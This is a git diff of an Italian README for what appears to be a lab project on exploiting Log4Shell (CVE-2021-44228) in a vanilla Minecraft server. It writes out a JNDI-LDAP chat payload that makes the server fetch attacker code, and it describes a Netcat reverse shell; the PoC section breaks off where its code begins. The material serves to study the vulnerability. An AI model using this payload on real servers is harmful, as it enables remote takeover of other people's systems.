@@ -5,40 +5,40 @@
 - Riesce a comunicare con il server vulnerabile;
     * Ha a disposizione un account valido nel caso in cui il server richieda la verifica dell'account Microsoft.
 
-- **(!) L'attaccante può ottenere il controllo completo del sistema senza alcuna partecipazione da parte della vittima e senza autenticazione.**
+- **(!) L'attaccante può ottenere il controllo completo del sistema senza autenticazione e senza alcuna partecipazione da parte della vittima.**
 ---
 ## Preambolo:  cos'è un server Minecraft?
 Minecraft è un videogioco sandbox molto popolare che da vari anni è stato acquisito da Microsoft. Il gioco offre due versioni differenti, la "Java Edition" scritta appunto in Java, e la "Bedrock Edition" una versione multi-piattaforma scritta in C++, un server della bedrock edition non supporta client Java e viceversa.
 <br>Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.
 
 ## La vulnerabilità del server
-**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il logging dell'applicazione o dei servizi online offrendo anche la possibilità di comunicare con altri servizi sul sistema. Il problema nasce da una funzionalità  fare il *lookup* e risolvere variabili tramite il protocollo JNDI (Java Name and Directory Interface), funzione abilitata di default nelle versioni critiche di Log4j. In questo caso si forza l'ottenimento di un oggetto Java tramite un server LDAP che può essere potenzialmente ovunque su internet. 
+**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il logging dell'applicazione o dei servizi online offrendo anche la possibilità di comunicare con altri servizi sul sistema. Log4j offriva la possibilità di eseguire *lookup* risolvendo variabili tramite il protocollo JNDI (Java Name and Directory Interface), funzione abilitata di default nelle versioni critiche di Log4j.
 Minecraft implementa questo framework che sarà la causa della vulnerabilità, consentendo all'attaccante di eseguire codice malevolo da remoto senza autenticazione e senza che ci sia un operazione manuale da parte della vittima.
 
 Dalla versione 1.7 fino alla 1.18 del gioco è stata trovata la vulnerabilità zero-day **CVE-2021-44228**, meglio nota come Log4Shell.
-Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi direttamente sostituendo la versione nella repository ufficiale per i client. 
+Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi, sostituendo direttamente la versione nella repository ufficiale per i client. 
 Le patch sono automatiche nei confronti dei giocatori prevenendo gli attacchi verso i client, non è quindi possibile effettuare questo attacco nei confronti di quest ultimi.
 
-I server ufficiali sono chiamati "Vanilla", ossia senza modifiche del server stesso, tuttavia non sono in grado di prevenire l'abuso di cheat all'interno del gioco non offrendo funzionalità aggiuntive. Per questo motivo sono stati creati dalla community, versioni di terze parti (es: Bukkit, Spigot, PaperMC) che consentono maggior sicurezza e l'installazione di plugins scritti in Java.
+I server ufficiali sono chiamati "Vanilla", ossia senza modifiche del server stesso, tuttavia non sono in grado di prevenire l'abuso di cheat all'interno del gioco e non offrono funzionalità aggiuntive di sicurezza e personalizzazione. Per questo motivo sono stati creati dalla community, versioni di terze parti (es: Bukkit, Spigot, PaperMC) che consentono maggior sicurezza e l'installazione di plugins scritti in Java.
 
 Il problema si pone infatti lato server, se l'host non effettua manualmente la patch del server in base alla versione di riferimento [(vedi nota Mojang/Microsoft)](#fontirisorse-esterne-citate), l'exploit potrebbe avere successo. I server terzi, al contrario di quelli Vanilla, tendono ad utilizzare delle tecniche di aggiornamento automatico (obbligatorio però il riavvio del server per la discovery delle patch) rendendo maggiormente più difficile l'attacco.
 Per questo motivo (e per non appesantire eccessivamente il sistema) si è scelto l'utilizzo del server Vanilla 1.8.1 come server vittima.
 
 ## L'attacco *"in a nutshell"*
 L'attacco parte sulla creazione di un server LDAP che sarà il punto di ingresso del traffico verso la vittima.
-Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'iniezione del codice malevolo.
-Si scrive una classe Java che al suo interno contenga del codice malevolo come ad esempio la cancellazione di file o l'installazione di un ransomware.
+Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'iniezione.
+Si scrive una classe Java che al suo interno contenga del codice malevolo come ad esempio la cancellazione di file, l'installazione di un ransomware ecc...
 
 Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluta utilizzare una classe Java che ne consenta il Remote Code Execution tramite una reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.
 
 **Injection**: La fase di iniezione consiste di inviare via chat di gioco, un messaggio così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inizi una connessione LDAP al server dell'attaccante.
-Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP.
+Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP purché avente valido account Microsoft nel caso di server con verifica.
 
 Una volta che la connessione LDAP è stabilita con l'attaccante, il server rigetterà la richiesta al server HTTP che userà la classe Java (precompilata) come response al server vittima.
 
-Il server vittima ricevuta la classe la deserielizzerà eseguendone il codice, nel nostro caso come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server Netcat aprendo una reverse shell con l'attaccante.
+Quest'ultimo ricevuta la classe la deserielizzerà eseguendone il codice, nel nostro caso come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server Netcat aprendo una reverse shell con l'attaccante.
 
-A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante e potrà eseguire tutte le operazioni che vorrà, ad esempio installare un malware, creare persistenza, effettuare movimenti laterali ecc...
+A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante.
 
 ## Tool necessari per l'attacco
 * **Server LDAP** si è utilizzata la classe Java `LDAPRefServer.java` nella sezione JNDI della repo GitHub [Marshalsec](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) contenente vari tool (gadget) inerenti *"all'insicurezza delle deserializzazioni"* di Java.
@@ -47,14 +47,14 @@ A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante
 
 * **Maven**: Fondamentale per eseguire il packaging del progetto del server LDAP.
 
-* **JDK 1.8.0_181**: E' necessario l'utilizzo della stessa versione Java con cui il server Minecraft è compilato, altrimenti l'esecuzione della classe malevola sul server non funzionerebbe.
+* **JDK 1.8.0_181**: È necessario l'utilizzo della stessa versione Java con cui il server Minecraft è compilato, altrimenti l'esecuzione della classe malevola sul server non funzionerebbe.
 * **Python**: Per l'avvio di un server http che consenta l'invio della classe Java.
 * **Netcat**: Per consentire la connessione TCP della vittima all'attaccante in modo da fornire una reverse shell.
 
 ## PoC
 **Passaggi partici dell'attacco, a partire dalla preparazione dell'ambiente dell'attaccante fino all'iniezione dell'exploit.**
 
-***Nota:*** *Nel nostro caso si è utilizzata una macchina virtuale con sistema operativo Kali, mentre per il server vittima si è utilizzato direttamente la macchina pre-configurata Metasploitable3 per questioni di comodità. Tuttavia questa macchina è configurata in modo tale da essere facilmente penetrabile, in un contesto diverso queste operazioni potrebbero non essere le stesse (come meglio descritto nelle [conclusioni](#mitigazioni-e-conclusioni)).*
+***Nota:*** *Nel nostro caso per l'attaccante si è utilizzata una macchina virtuale con sistema operativo Kali, mentre per il server vittima si è utilizzato direttamente la macchina pre-configurata Metasploitable3 per questioni di comodità. Tuttavia questa macchina è configurata in modo tale da essere facilmente penetrabile, in un contesto diverso queste operazioni potrebbero non essere le stesse (come meglio descritto nelle [conclusioni](#mitigazioni-e-conclusioni)).*
 
 **1)** Scrittura classe Java e compilarla tramite "javac" con la stessa versione del server vulnerabile che darà in output un file .class essenziale per il server HTTP:
 ```console
